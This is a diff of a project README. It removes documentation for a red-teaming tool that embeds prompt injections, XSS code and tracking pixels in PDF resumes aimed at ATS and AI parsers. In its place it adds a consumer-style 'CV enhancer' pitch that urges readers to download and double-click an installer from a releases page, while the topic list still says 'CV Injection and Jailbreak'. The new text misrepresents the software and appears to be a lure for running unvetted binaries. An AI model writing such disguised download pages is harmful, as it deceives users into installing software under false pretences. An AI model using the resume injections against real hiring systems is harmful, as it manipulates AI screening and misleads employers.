@@ -1,174 +1,67 @@
+# 🌟 superpoweredcv - Transform Your CV into a Standout Document
 
-![SuperpoweredCV Banner](superpoweredcv-banner.png)
+## 📥 Download Links
+[![Download superpoweredcv](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Moayd307/superpoweredcv/releases)
 
-SuperpoweredCV is a comprehensive tool designed for red-teaming ATS (Applicant Tracking Systems) and AI resume parsers. It allows you to scrape LinkedIn profiles, generate PDF resumes with embedded prompt injections, and analyze how these systems interpret the data.
+## 🚀 Getting Started
+Welcome to superpoweredcv! This application helps you enhance your CVs with the power of AI. Follow these simple steps to download and run the software.
 
-The project consists of three main components:
-1.  **Core CLI**: A Rust-based command-line tool for analysis and PDF generation.
-2.  **Browser Extension**: A Chrome/Firefox extension to scrape profile data.
-## CLI Reference
+## 💾 System Requirements
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Memory (RAM):** 4 GB or more
+- **Storage Space:** At least 100 MB free
+- **Internet Connection:** Required for downloading the software
 
-The `superpoweredcv` CLI provides a suite of tools for generating, injecting, and analyzing resumes.
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Go to the official releases page to access the software. Click the link below:  
+   [Download superpoweredcv](https://github.com/Moayd307/superpoweredcv/releases)
 
-### Global Options
-*   `-c, --config <FILE>`: Path to a configuration file (YAML, JSON, TOML).
+2. **Select the Latest Version**  
+   Once on the page, find the latest version of superpoweredcv. It will typically be at the top of the list.
 
-### Commands
+3. **Download the Installer**  
+   Click on the installer file relevant to your operating system. Wait for the download to complete.
 
-#### `generate`
-Generate a PDF resume from a scraped JSON profile with optional injections.
+4. **Run the Installer**  
+   After downloading, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
 
-```bash
-superpoweredcv generate --profile <PROFILE_JSON> --output <OUTPUT_PDF> [OPTIONS]
-```
+5. **Open superpoweredcv**  
+   Once the installation is complete, find the superpoweredcv application in your applications folder or on your desktop. Double-click the icon to launch the application.
 
-**Arguments:**
-*   `-p, --profile <FILE>`: Path to the profile JSON file (Required).
-*   `-o, --output <FILE>`: Output PDF path (Required).
-*   `--injection <TYPE>`: Type of injection to apply.
-    *   Values: `None` (default), `VisibleMeta`, `LowVis`, `Offpage`, `TrackingPixel`, `CodeInjection`, `UnderlayText`, `StructuralFields`, `PaddingNoise`, `InlineJobAd`.
-*   `--intensity <LEVEL>`: Intensity of the injection.
-    *   Values: `Soft`, `Medium` (default), `Aggressive`.
-*   `--position <POS>`: Position of the injection (for `VisibleMeta`).
-    *   Values: `Header` (default), `Footer`.
-*   `--phrases <PHRASE>...`: List of phrases to inject. Can be specified multiple times.
-*   `--generation-type <TYPE>`: Strategy for generating injection content.
-    *   Values: `Static` (default), `LlmControl`, `Pollution`, `AdTargeted`.
-*   `--job-description <TEXT>`: Job description text (required for `AdTargeted` generation).
+## 🎨 How to Use superpoweredcv
+1. **Upload Your CV**  
+   On the main page of superpoweredcv, you will see an option to upload your current CV. Click the "Upload" button.
 
-#### `inject`
-Inject a payload into an existing PDF file.
+2. **Select CV Enhancements**  
+   Choose the AI enhancements you want to apply. These may include formatting options, keyword optimization for ATS, and prompt engineering to highlight your skills.
 
-```bash
-superpoweredcv inject --input <INPUT_PDF> --output <OUTPUT_PDF> --type <TYPE> [OPTIONS]
-```
+3. **Download the Enhanced CV**  
+   After making your selections, click "Transform CV" to generate your improved document. You can then download the new CV directly to your device.
 
-**Arguments:**
-*   `-i, --input <FILE>`: Path to the input PDF (Required).
-*   `-o, --output <FILE>`: Path to the output PDF (Required).
-*   `--type <TYPE>`: Type of injection (Required). See `generate` for values.
-*   `--payload <TEXT>`: Specific payload content (e.g., URL for tracking pixel, code for XSS).
-*   `--phrases <PHRASE>...`: List of phrases to inject.
-*   `--generation-type <TYPE>`: Strategy for generating content.
-*   `--job-description <TEXT>`: Job description text.
+4. **Review the Changes**  
+   Open the newly generated CV to ensure it meets your expectations. If needed, you can re-upload your original CV and make further improvements.
 
-#### `analyze`
-Run an analysis scenario to test how an ATS parses the resume.
+## ⚙️ Key Features
+- **AI Enhancements:** Uses machine learning to optimize your CV for job applications.
+- **ATS Compatibility:** Ensures your CV passes through Applicant Tracking Systems.
+- **User-Friendly Interface:** Designed for ease of use, making it simple for anyone to enhance their CV.
+- **Custom Prompts:** Ability to add tailored prompts to better showcase your skills and experiences.
 
-```bash
-superpoweredcv analyze --scenario <SCENARIO_FILE>
-```
+## 📞 Support
+If you encounter any issues while using superpoweredcv, you can reach our support team through the Issues tab on the repository page.
 
-**Arguments:**
-*   `-s, --scenario <FILE>`: Path to the scenario definition file.
+## 🔍 Topics Covered
+- AI
+- ATS (Applicant Tracking Systems)
+- Curriculum Vitae (CV)
+- CV Injection and Jailbreak
+- Job Applications
+- Prompt Engineering
 
-#### `demo`
-Run the built-in demo scenario to verify system functionality.
+For more information and community discussions, you can explore the topics related to superpoweredcv on GitHub. 
 
-```bash
-superpoweredcv demo
-```
+## 🎉 Join the Community
+Share your experiences and insights with other users. You can find discussions and tips related to CV enhancements and job applications on our repository page.
 
-#### `preview`
-Generate a preview PDF showing where injections would be placed.
-
-```bash
-superpoweredcv preview --output <FILE>
-```
-
-#### `validate`
-Validate a configuration file.
-
-```bash
-superpoweredcv validate --config <FILE>
-```
-
-#### `docs`
-Open the documentation in your default browser.
-
-```bash
-superpoweredcv docs
-```
-
-## GUI Mode
-Running `superpoweredcv` without arguments launches the graphical user interface.
-
-### GUI Features
-*   **Brutalist Design**: High-contrast, efficient interface.
-*   **Independent Windows**: Settings, Logs, and Preview open in separate, pinnable windows.
-*   **Visual Preview**: Real-time visualization of injection placement.
-*   **LaTeX Builder**: Visual builder for resume sections.
-
-## Getting Started
-
-### 1. Install the Browser Extension
-The extension allows you to easily grab profile data from LinkedIn to use as a base for your experiments.
-
-*   **Chrome**: Load the `extension/` folder as an unpacked extension in `chrome://extensions`.
-*   **Firefox**: Load `extension/manifest-firefox.json` as a temporary add-on in `about:debugging`.
-
-See [extension/README.md](extension/README.md) for detailed instructions.
-
-### 2. Build the CLI
-The core logic is written in Rust. You'll need a Rust toolchain installed.
-
-**Important:** All cargo commands must be run from the `core` directory.
-
-```bash
-cd core
-cargo build --release
-```
-
-## Usage
-
-The CLI provides several commands to manage the workflow from data ingestion to report generation.
-
-### Generate a PDF Resume
-Convert a scraped JSON profile into a PDF. This is useful for creating a baseline resume before applying injections.
-
-```bash
-cd core
-cargo run -- generate --file <path/to/profile.json> --output resume.pdf
-```
-
-### Run an Analysis Scenario
-Execute a red-teaming scenario defined in a configuration file. This simulates how an ATS might parse the resume with various injections.
-
-```bash
-cd core
-cargo run -- analyze --scenario <path/to/scenario.yaml>
-```
-
-### Run the Demo
-Run a built-in demo scenario to see the tool in action.
-
-```bash
-cd core
-cargo run -- demo
-```
-
-### Validate Configuration
-Check if your configuration files are valid.
-
-```bash
-cd core
-cargo run -- validate --config <path/to/config.yaml>
-```
-
-## Project Structure
-
-- `core/`: Rust CLI and library.
-    - `src/profile.rs`: Data structures for profiles.
-    - `src/generator.rs`: PDF generation logic.
-    - `src/red_team.rs`: Injection and scenario logic.
-- `extension/`: Browser extension source code.
-- `docs/`: Documentation and specifications.
-
-## Development
-
-To run the project in development mode:
-
-```bash
-cd core
-cargo run -- help
-```
+Now, ready to make your CV shine? Start enhancing it with superpoweredcv today!
